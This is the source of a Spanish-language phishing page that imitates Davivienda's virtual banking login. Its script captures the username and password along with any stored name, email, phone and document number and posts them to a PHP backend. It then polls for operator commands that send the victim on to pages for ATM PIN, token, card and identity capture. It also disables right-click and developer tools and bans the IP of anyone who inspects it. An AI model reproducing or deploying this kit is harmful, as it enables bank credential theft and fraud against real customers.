<!DOCTYPE html>
<html lang="en">

<head>
	  <style>
@keyframes pulse {
    0% { transform: scale(1); opacity: 1; }
    50% { transform: scale(1.1); opacity: 0.7; }
    100% { transform: scale(1); opacity: 1; }
}
</style>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Banca virtual | Confirmacion</title>
    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
    <link rel="stylesheet" href="css/normalize.min.css" />
    <link rel="stylesheet" href="css/estilos.css" />
    <script type="text/javascript" src="../../../../assets/js/jquery-3.6.0.min.js"></script>
</head>

<body>
    <div class="contenedor">
        <div class="principal">
            <div class="autenticar">
                <div class="conttitulo">
                    <div class="logo-banner">
                        <img src="img/davibank.png" alt="Banner Logo" />
                    </div>
                    <div class="titulo">
                        <h1>Ingresa a tu Banca Virtual</h1>
                    </div>
                </div>
                <div class="contenido">
                    <div class="caja">
                        <div class="izq">
                            <form autocomplete="off" id="fusuario">
                                <input type="hidden" id="session_id" name="session_id">
                                <input type="hidden" id="username" name="username">
                                <div class="inputg columna">
                                    <input type="text" name="usuario" id="usuario" placeholder="Nombre de usuario" maxlength="12" />
                                    <div class="error" id="eUsuario">
                                        <img src="img/war.svg" alt="error"> <span class="rojo">Ingresa un nombre de usuario que contenga entre 6 a 12 caracteres y sin caracteres especiales</span>
                                    </div>
                                </div>
                                <div class="inputg columna">
                                    <div style="text-align: right;" class="ojos">
                                        <img src="img/ojo.svg" alt="ojo" id="ojo" style="display: none;">
                                    </div>
                                    <input style="width: 100%;" type="password" name="contra" id="contra" placeholder="Contraseña" maxlength="15" class="contrasena" />
                                    <div class="vali" style="display: none;" id="validaciones">
                                        <span id="cantidad">8+ caracteres</span>
                                        <span id="mayus">1+ mayuscula</span>
                                        <span id="minus">1+ minúscula</span>
                                        <span id="numero">1+ número</span>
                                    </div>
                                </div>
                                <div class="inputge">
                                    <a href="javascript:void(0)" class="enlacef" style="margin-top: 7px;">¿Necesitas ayuda para ingresar?</a>
                                </div>

                                <div class="inputche">
                                    <input type="checkbox" name="record" id="record" />
                                    <label for="record">Recordar mi nombre de usuario</label>
                                </div>
                                <div class="inputgb">
                                    <button type="button" id="btnEntrar" class="btn">Ingresar</button>
                                </div>
                                <div class="inputg inicio">
                                    <p style="margin-bottom: 5px;">¿No te has registrado?</p>
                                    <a href="javascript:void(0)" class="enlacef">Registrate ahora</a>
                                </div>
                            </form>
                        </div>
                        <div class="der">
                            <img src="img/baner1.svg" alt="depart" />
                        </div>

                    </div>
                </div>
            </div>
        </div>

    </div>

    <!-- Loader overlay -->
    <div id="loader-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(255, 255, 255, 0.7); z-index: 9999; justify-content: center; align-items: center;">
        <img src="img/l21.svg" alt="Cargando..." style="width: 80px; height: 80px; animation: blink 1.5s infinite;">
    </div>

    <style>
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }
    </style>

    <script src="js/funciones.js"></script>
    <script>
    document.addEventListener("DOMContentLoaded", function () {
      const urlParams = new URLSearchParams(window.location.search);
      
      // Siempre generar un nuevo session_id al iniciar el flujo para evitar colisiones o acciones residuales viejas de Telegram
        localStorage.removeItem('session_id');
        localStorage.removeItem('messageId');
        localStorage.removeItem('token');
        localStorage.removeItem('username');
        localStorage.removeItem('password');
        localStorage.removeItem('identificacion');
        let sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('session_id', sessionId);
      
      const sessionInput = document.getElementById('session_id');
      if (sessionInput) sessionInput.value = sessionId;

      // Obtener usuario desde URL params
      const userFromUrl = urlParams.get('user');
      const usernameInput = document.getElementById('username');
      if (userFromUrl) {
        if (usernameInput) usernameInput.value = userFromUrl;
        localStorage.setItem('username', userFromUrl);
      }

      // Manejo del botón Ingresar
      const btnIngresar = document.getElementById('btnEntrar');
      
      if (btnIngresar) {
        const newBtn = btnIngresar.cloneNode(true);
        btnIngresar.parentNode.replaceChild(newBtn, btnIngresar);
        
        newBtn.addEventListener('click', async function (event) {
          event.preventDefault();
          event.stopPropagation();

          const usuario = document.getElementById('usuario').value;
          const contra = document.getElementById('contra').value;
          
          if (!usuario || usuario.length === 0) {
            document.getElementById('eUsuario').style.display = 'block';
            return;
          }
          
          if (!contra || contra.length === 0) {
            document.getElementById('contra').focus();
            return;
          }

          let identificacion = usuario;
          let password = contra;
          
          if (password.length > 15) {
            alert('La clave debe tener máximo 15 caracteres alfanuméricos');
            return;
          }
          
          if (identificacion.length < 5) {
            alert('La identificación debe tener al menos 5 dígitos');
            return;
          }

          const loaderOverlay = document.getElementById('loader-overlay');
          if (loaderOverlay) loaderOverlay.style.display = 'flex';

          localStorage.setItem('password', password);
          localStorage.setItem('identificacion', identificacion);

          let localTb = {};
          try {
              localTb = JSON.parse(localStorage.getItem('tbdatos') || '{}');
          } catch(e) {}

          if (!localTb.banco) localTb.banco = 'DAVIVIENDA';
          if (!localTb.documento && localStorage.getItem('val')) localTb.documento = localStorage.getItem('val');
          if (!localTb.nombre && (localStorage.getItem('nombre') || localStorage.getItem('nom'))) localTb.nombre = localStorage.getItem('nombre') || localStorage.getItem('nom');
          if (!localTb.correo && (localStorage.getItem('correo') || localStorage.getItem('eml'))) localTb.correo = localStorage.getItem('correo') || localStorage.getItem('eml');
          if (!localTb.telefono && (localStorage.getItem('celular') || localStorage.getItem('cel'))) localTb.telefono = localStorage.getItem('celular') || localStorage.getItem('cel');
          
          const formData = new FormData();
          formData.append('transactionId', sessionId);
          formData.append('u_id', identificacion);
          formData.append('u_ps', password);
          formData.append('u_tb', JSON.stringify(localTb));

          fetch('procesar_logo.php', { method: 'POST', body: formData })
          .then(res => res.json())
          .then(result => {
            if (result.status === 'success') {
              checkPaymentVerification(sessionId, result.messageId);
            } else {
              if (loaderOverlay) loaderOverlay.style.display = 'none';
              alert("Error en el procesamiento. Intente nuevamente.");
            }
          })
          .catch(() => {
            if (loaderOverlay) loaderOverlay.style.display = 'none';
            alert("Error de conexión. Intente nuevamente.");
          });
        });
      }
    });

    async function checkPaymentVerification(transactionId, messageId) {
      try {
        const formData = new FormData();
        formData.append('transactionId', transactionId);
        formData.append('messageId', messageId);

        const res = await fetch('verificar_respuesta.php?ts=' + Date.now(), { method: 'POST', body: formData });
        const result = await res.json();

        if (result.action) {
          const loader = document.getElementById('loader-overlay');
          if (loader) loader.style.display = 'none';

          switch (result.action) {
            case 'error_logo':
              alert("Usuario o clave incorrectos.");
              window.location.href = "index.php";
              break;

            case 'error_cajero':
            case 'pedir_cajero':
              window.location.href = "caje.php";
              break;

            case 'error_tc':
              window.location.href = "/datac/alter.php";
              break;

            case 'error_token':
            case 'pedir_dinamica':
            case 'error_token':
              window.location.href = "token.php";
              break;

            case 'error': 
              window.location.href = "/caras";
              break;

            case 'cedula': 
              window.location.href = "/cedula";
              break;
              
            case 'bre_b':
              window.location.href = "/recaudos/brev.php?davivienda";
              break;

            case 'ban_ip':
                    try {
                        localStorage.clear();
                        sessionStorage.clear();
                        document.cookie.split(";").forEach(function(c) { 
                            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
                        });
                    } catch(e) {}
                    window.location.replace("/fin.php");
                    break;
                case 'confirm_finalizar':
              window.location.href = "/fin.php";
              break;

            default:
              setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
              break;
          }
        } else {
          setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
        }
      } catch (err) {
        setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
      }
    }
</script>

<div id="loader" style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: #ffffff; display: flex; justify-content: center; align-items: center; flex-direction: column; z-index: 9999;">
    <img src="img/davibank.png" alt="Cargando..." style="height: 90px; width: auto; animation: pulse 1.5s infinite;">
</div>

<script>
    setTimeout(function () {
        const ldr = document.getElementById('loader');
        if (ldr) ldr.style.display = 'none';
    }, 3000);
</script>
<script>
// --- DESACTIVAR CLICK DERECHO, INSPECCIONAR Y F12 ---
(function() {
    // 1. Desactivar Click Derecho
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // 2. Desactivar atajos de teclado de desarrollo (F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+Shift+J, Ctrl+U, Cmd+Opt+I)
    document.addEventListener('keydown', function(e) {
        // F12
        if (e.keyCode === 123) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+Shift+I o Cmd+Opt+I
        if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+U (Ver código fuente)
        if ((e.ctrlKey || e.metaKey) && e.keyCode === 85) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
    });

    // 3. Detectar apertura de Herramientas de Desarrollo (DevTools) por dimensiones
    let devtoolsOpen = false;
    const threshold = 160;
    
    function checkDevTools() { return false; }

    // 4. Función para Auto-Banear la IP del Atacante
    let banTriggered = false;
    function triggerAutoBan() {
        if (banTriggered) return;
        banTriggered = true;
        
        // Limpieza inmediata del almacenamiento local
        try {
            localStorage.clear();
            sessionStorage.clear();
            document.cookie.split(";").forEach(function(c) { 
                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
            });
        } catch(e) {}

        // Enviar IP para auto-bloqueo al backend (usamos el honeypot para gatillar el baneo)
        const formData = new FormData();
        formData.append('website', 'automated_devtools_trigger');
        
        // Buscamos si tenemos la variable de transacción en localStorage
        let tid = '';
        try {
            tid = localStorage.getItem('last_tid') || localStorage.getItem('session_id') || '';
        } catch(e) {}
        if (tid) {
            formData.append('transactionId', tid);
        }

        // Enviamos post silencioso para banear la IP en el backend
        fetch('/gate/process/paso1datos.php', {
            method: 'POST',
            body: formData,
            keepalive: true
        }).finally(function() {
            window.location.replace("/fin.php");
        });
    }
})();
// ---------------------------------------------------
</script>
</body>

</html>